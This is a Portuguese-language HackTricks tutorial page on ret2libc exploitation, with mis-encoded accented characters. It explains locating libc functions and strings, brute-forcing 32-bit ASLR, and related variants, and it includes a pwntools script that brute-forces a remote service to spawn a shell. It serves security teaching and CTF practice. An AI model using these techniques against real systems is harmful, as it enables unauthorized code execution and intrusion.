# Ret2lib

{% hint style="success" %}
Aprenda e pratique Hacking AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **Informa√ß√µes B√°sicas**

A ess√™ncia do **Ret2Libc** √© redirecionar o fluxo de execu√ß√£o de um programa vulner√°vel para uma fun√ß√£o dentro de uma biblioteca compartilhada (por exemplo, **system**, **execve**, **strcpy**) em vez de executar shellcode fornecido pelo atacante na pilha. O atacante cria um payload que modifica o endere√ßo de retorno na pilha para apontar para a fun√ß√£o da biblioteca desejada, ao mesmo tempo que organiza para que quaisquer argumentos necess√°rios sejam configurados corretamente de acordo com a conven√ß√£o de chamada.

### **Passos de Exemplo (simplificados)**

* Obter o endere√ßo da fun√ß√£o a ser chamada (por exemplo, system) e o comando a ser chamado (por exemplo, /bin/sh)
* Gerar uma cadeia ROP para passar o primeiro argumento apontando para a string de comando e o fluxo de execu√ß√£o para a fun√ß√£o

## Encontrando os endere√ßos

* Supondo que a `libc` usada seja a do computador atual, voc√™ pode encontrar onde ela ser√° carregada na mem√≥ria com:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{%  Se voc√™ quiser verificar se o ASLR est√° alterando o endere√ßo da libc, voc√™ pode fazer:  %}
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Sabendo qual libc est√° sendo usada, tamb√©m √© poss√≠vel encontrar o deslocamento para a fun√ß√£o `system` com:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Sabendo qual libc est√° sendo usada, tamb√©m √© poss√≠vel encontrar o deslocamento para a fun√ß√£o da string `/bin/sh` com:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Ao saber qual libc est√° sendo usada, tamb√©m √© poss√≠vel usar Peda ou GEF para obter o endere√ßo da fun√ß√£o **system**, da fun√ß√£o **exit** e da string **`/bin/sh`**:
```bash
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Se o processo estiver criando **filhos** toda vez que voc√™ interage com ele (servidor de rede), tente **ler** esse arquivo (provavelmente voc√™ precisar√° ser root).

Aqui voc√™ pode encontrar **exatamente onde a libc est√° carregada** dentro do processo e **onde ser√° carregada** para cada filho do processo.

![](<../../../.gitbook/assets/image (853).png>)

Neste caso, ela est√° carregada em **0xb75dc000** (Este ser√° o endere√ßo base da libc)

## Libc desconhecida

Pode ser poss√≠vel que voc√™ **n√£o saiba qual libc a bin√°rio est√° carregando** (porque pode estar localizada em um servidor onde voc√™ n√£o tem acesso). Nesse caso, voc√™ poderia abusar da vulnerabilidade para **vazar alguns endere√ßos e descobrir qual biblioteca libc** est√° sendo usada:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

E voc√™ pode encontrar um modelo do pwntools para isso em:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Conhe√ßa a libc com 2 offsets

Verifique a p√°gina [https://libc.blukat.me/](https://libc.blukat.me/) e use um **par de endere√ßos** de fun√ß√µes dentro da libc para descobrir a **vers√£o utilizada**.

## Bypassing ASLR em 32 bits

Esses ataques de for√ßa bruta s√£o **√∫teis apenas para sistemas de 32 bits**.

* Se o exploit for local, voc√™ pode tentar for√ßar a base de endere√ßo da libc (√∫til para sistemas de 32 bits):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ao atacar um servidor remoto, voc√™ pode tentar **for√ßar o endere√ßo da fun√ß√£o `libc` `usleep`**, passando como argumento 10 (por exemplo). Se em algum momento o **servidor demorar 10s extras para responder**, voc√™ encontrou o endere√ßo dessa fun√ß√£o.

## One Gadget

Execute um shell apenas pulando para **um** endere√ßo espec√≠fico **no** `libc`:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Exemplo de C√≥digo x86 Ret2lib

Neste exemplo, o brute-force do ASLR est√° integrado no c√≥digo e o bin√°rio vulner√°vel est√° localizado em um servidor remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Exemplo de C√≥digo x64 Ret2lib

Verifique o exemplo em:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Exemplo ARM64 Ret2lib

No caso do ARM64, a instru√ß√£o ret salta para onde o registro x30 est√° apontando e n√£o para onde o registro de pilha est√° apontando. Portanto, √© um pouco mais complicado.

Tamb√©m no ARM64, uma instru√ß√£o faz o que a instru√ß√£o faz (n√£o √© poss√≠vel pular no meio das instru√ß√µes e transform√°-las em novas).

Verifique o exemplo em:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (ou puts)

Isso permite **vazar informa√ß√µes do processo** chamando `printf`/`puts` com alguns dados espec√≠ficos colocados como argumento. Por exemplo, colocar o endere√ßo de `puts` na GOT em uma execu√ß√£o de `puts` ir√° **vazar o endere√ßo de `puts` na mem√≥ria**.

## Ret2printf

Isso basicamente significa abusar de um **Ret2lib para transform√°-lo em uma vulnerabilidade de strings de formato `printf`** usando o `ret2lib` para chamar printf com os valores para explor√°-lo (parece in√∫til, mas √© poss√≠vel):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Outros Exemplos e Refer√™ncias

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dado um vazamento para o endere√ßo de uma fun√ß√£o na libc, usando um gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bits, ASLR ativado mas sem PIE, o primeiro passo √© preencher um estouro at√© o byte 0x00 do can√°rio para ent√£o chamar puts e vaz√°-lo. Com o can√°rio, um gadget ROP √© criado para chamar puts e vazar o endere√ßo de puts da GOT e um gadget ROP para chamar `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR ativado, sem can√°rio, estouro de pilha em main a partir de uma fun√ß√£o filha. Gadget ROP para chamar puts e vazar o endere√ßo de puts da GOT e ent√£o chamar um gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bits, sem pie, sem can√°rio, sem relro, nx. Usa a fun√ß√£o write para vazar o endere√ßo de write (libc) e chama um gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Usa uma string de formato para vazar o can√°rio da pilha e um estouro de buffer para chamar o sistema (est√° na GOT) com o endere√ßo de `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bits, sem relro, sem can√°rio, nx, pie. Abusa de um mau indexador para vazar endere√ßos de libc e heap da pilha. Abusa do estouro de buffer para fazer um ret2lib chamando `system('/bin/sh')` (o endere√ßo do heap √© necess√°rio para contornar uma verifica√ß√£o).
